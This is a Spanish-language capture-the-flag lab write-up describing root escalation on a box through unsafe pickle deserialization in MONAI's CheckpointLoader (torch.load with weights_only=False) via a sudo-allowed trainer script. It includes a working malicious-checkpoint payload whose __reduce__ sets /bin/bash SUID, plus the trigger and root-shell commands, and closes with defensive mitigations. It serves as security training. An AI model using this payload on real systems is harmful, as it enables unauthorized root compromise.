# Fase 09 — Escalada a root: deserialización en el trainer de MONAI (`torch.load`)

> El cierre de la máquina. Y el detalle bonito: es **la misma clase de bug que el foothold**
> (deserialización insegura de `pickle`), ahora en un cargador de modelos de IA ejecutado como root.

## 🎯 Objetivo
De `developer` (host) a **root**, abusando de un script que developer puede ejecutar como root.

## 1. `sudo -l` — la puerta
```
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```
developer puede ejecutar **ese script concreto como root, sin contraseña**.

> 🧠 **Matiz de sudo:** la regla fija el comando **con su argumento** (`bedside_trainer.py`). sudo
> **no** permite añadir argumentos propios → no podemos pasarle `--scanner` ni una ruta nuestra. Por
> tanto, el fallo **tiene que estar en lo que el script lee del disco**, no en sus parámetros.

## 2. El fallo en `bedside_trainer.py`
El script, al arrancar como root, busca el checkpoint `.pt` más reciente y lo carga:
```python
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)   # el *.pt más NUEVO de /datastore/checkpoints
if latest_ckpt:
    loader = CheckpointLoader(load_path=str(latest_ckpt), load_dict={...}, map_location=DEVICE)
    loader(engine)     # MONAI -> torch.load(load_path, weights_only=False) -> pickle
```
`CheckpointLoader` (MONAI) hace por debajo **`torch.load(..., weights_only=False)`**, que deserializa
con **`pickle`**. Un `.pt` con un objeto cuyo `__reduce__` llame a `os.system` = **RCE como root**.

> El `weights_only=False` es la clave: en PyTorch ≥ 2.6 `torch.load` por defecto es `weights_only=True`
> y **bloquearía** este ataque. MONAI lo llama con `False` por compatibilidad → bug vivo.

## 3. El muro de permisos (el matiz que casi nos frena)
```
drwxrwx--- 8 datawrangler dataops  /datastore        # 770
developer: uid=1000 groups=developer,users           # ni datawrangler ni dataops
```
`/datastore` (donde van los checkpoints) es **770 `datawrangler:dataops`**. `developer` **no tiene
acceso** (ni listar) → **no puede plantar el checkpoint malicioso**.

Pero el dueño es **`datawrangler`**, ¡el usuario del **contenedor**! Y `/datastore` es un **volumen
compartido** host↔contenedor (uid 988 coincide). Conclusión — el escalado necesita **las dos manos**:

```
┌─ CONTENEDOR (datawrangler, uid 988) ─┐        ┌─ HOST (developer) ─────────────┐
│ escribe el .pt malicioso en          │        │ sudo /opt/trainer/...py        │
│ /datastore/checkpoints/  (compartido)│───────►│ root hace torch.load del .pt   │
└──────────────────────────────────────┘        │ -> os.system(...) como ROOT    │
                                                 └────────────────────────────────┘
```

## 4. Dos condiciones para que el trainer llegue a `torch.load`
Antes del checkpoint hay un **gate de datos**: si no hay imágenes en `processed`/`staging`, el script
hace `return` y no carga nada. Además `ALLOWED_EXTS` **incluye `txt`** → un `.txt` en `processed`
hace **petar** `LoadImaged`. Así que, como datawrangler, hay que:
1. dejar **una imagen válida** (un PNG mínimo) en `/datastore/processed/`, y
2. **limpiar** los `.txt`/basura de `processed` y `staging`.

## 5. Por qué automatizamos el setup dentro del payload
La shell interactiva del contenedor era **inestable** (se caía entre comandos). En vez de pelearla,
metimos **todo el setup dentro del propio payload de pdfminer** (que corre como datawrangler, dentro
de Python). Así, en una sola ejecución y sin shell, el contenedor:
- construye el `.pt` malicioso en `/datastore/checkpoints/checkpoint_epoch_99.pt`,
- limpia `processed`/`staging` y deja un `scan.png` válido.

Script: [`../exploit/poc/exploit_root_setup.py`](../exploit/poc/exploit_root_setup.py).

### El checkpoint malicioso (formato torch = ZIP)
Un `.pt` moderno es un **ZIP** con `archive/data.pkl` (el pickle) + `archive/version` +
`archive/byteorder`. Metemos en `data.pkl` un objeto con `__reduce__`:
```python
class R:
    def __reduce__(self):
        return (os.system, ("chmod +s /bin/bash",))
# pickle.dumps({"model": R()}) -> el pickle referencia os.system (portable),
# NO a la clase R (R solo se usa al serializar).
```

## 6. Disparo y prueba
Como **developer** en el host:
```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```
Salida real:
```
INFO | Using 1 samples for training.
INFO | Found checkpoint /datastore/checkpoints/checkpoint_epoch_99.pt, loading with CheckpointLoader...
...
TypeError: Expected state_dict to be dict-like, got <class 'int'>.
```

> 🎓 **El `TypeError` ES la prueba de que funcionó, no un error nuestro:**
> 1. `torch.load` deserializó `{"model": R()}`.
> 2. Al deserializar `R()`, pickle ejecutó `os.system("chmod +s /bin/bash")` **como root** → `/bin/bash`
>    se volvió SUID en ese instante.
> 3. `os.system` devuelve un **int** (código de salida) → el dict quedó `{"model": 0}`.
> 4. MONAI siguió y llamó `load_state_dict(0)` → "esperaba dict, recibí int" → `TypeError`.
>
> El comando ya se ejecutó **antes** del crash. El error es ruido; el daño (SUID root) ya está hecho.

## 7. Cobro de root
```bash
ls -l /bin/bash        # -rwsr-sr-x  (la 's' = SUID)
/bin/bash -p           # shell con euid=0 (el -p conserva privilegios)
id                     # uid=1000(developer) euid=0(root)
cat /root/root.txt     # 🏁
```

## 🧩 El hilo conductor de toda la máquina
**Deserialización insegura de `pickle`, tres veces:**
| Momento | Dónde | Mecanismo |
|---|---|---|
| Foothold | pdfminer.six (PDF) | `pickle.loads` del CMap |
| Puente | servicio 3000 | path traversal (lectura de ficheros) |
| Root | MONAI `CheckpointLoader` | `torch.load` = `pickle` |

## 🛡️ Mitigaciones (lado defensivo)
- **Nunca** `torch.load` sobre datos no confiables con `weights_only=False`; en ≥2.6 dejar el default
  `True` y/o usar formatos seguros (**safetensors**).
- No ejecutar como root scripts que cargan artefactos escribibles por usuarios de menor privilegio.
- Separar bien privilegios: el proceso que **escribe** datos (datawrangler) no debería alimentar un
  proceso **root** sin validación/firmado de los artefactos.
- `sudo` con NOPASSWD sobre un intérprete (`python3 script.py`) es intrínsecamente peligroso: cualquier
  entrada que el script deserialice/importe se vuelve ejecución como root.

## 🏆 Estado
- [x] `sudo -l` → trainer ejecutable como root
- [x] Identificado `torch.load`/MONAI = deserialización insegura (misma clase que el foothold)
- [x] Plantado el checkpoint malicioso en el `/datastore` compartido (como datawrangler)
- [x] Disparado el trainer como root → `/bin/bash` SUID → **root shell**
- [x] `root.txt` capturada → **MÁQUINA OWNED (user + root)**
